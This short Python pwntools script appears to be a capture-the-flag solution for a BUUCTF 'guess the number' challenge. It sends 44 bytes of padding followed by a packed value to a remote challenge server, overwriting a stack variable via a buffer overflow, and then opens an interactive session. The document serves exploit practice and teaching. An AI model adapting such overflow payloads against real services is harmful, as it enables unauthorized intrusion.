from pwn import *
context.log_level = 'debug'
p = remote('node4.buuoj.cn','27071')#node4.buuoj.cn:27071
#p=process("./pwn1")
payload=44*b'a'+p32(0x41348000)
p.sendlineafter("Let's guess the number.",payload)
p.interactive()